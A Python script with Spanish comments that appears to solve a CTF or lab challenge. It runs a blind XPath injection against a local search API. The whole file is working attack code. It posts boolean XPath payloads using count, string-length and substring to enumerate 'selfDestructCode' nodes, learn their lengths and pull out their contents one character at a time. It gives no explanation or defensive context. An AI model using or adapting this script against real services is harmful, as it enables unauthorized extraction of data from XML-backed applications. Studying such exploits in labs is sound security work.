import requests
import json
import string

# URL del endpoint vulnerable
url = 'http://127.0.0.1:1337/api/search'

headers = {
    'Content-Type': 'application/json',
    'Accept': 'application/json'
}

# Extraer cuántos campos hay
campos = 0
while True:
    payload = json.dumps({
        "search": "' or count(//selfDestructCode)='"+str(campos)
    })

    response = requests.post(url, data=payload, headers=headers)

    if "failure" not in response.text:
        break
    else:
        campos += 1

diccionario = string.ascii_letters + string.digits + "!#%:;<>@_=}{"

# Extraer longitud del campo
for campo in range(1, campos + 1):
    longitud = 0
    contenido = ""
    while True:

        payload = json.dumps({
            "search": f"' or string-length((//selfDestructCode)[{campo}]/text())='{longitud}"
        })
        response = requests.post(url, data=payload, headers=headers)
        
        if "failure" not in response.text:
            # Extraer el contenido de la etiqueta
            while len(contenido) < longitud:
                for letra in diccionario:
                    payload = json.dumps({
                        "search": f"' or substring((//selfDestructCode)[{campo}]/text(),{len(contenido) + 1},1)='{letra}"
                    })
                    response = requests.post(url, data=payload, headers=headers)

                    if "failure" not in response.text:
                        contenido += letra
                        # Salimos del for
                        break
            print(contenido)
            # Salimos del primer while
            break
        else:
            longitud += 1
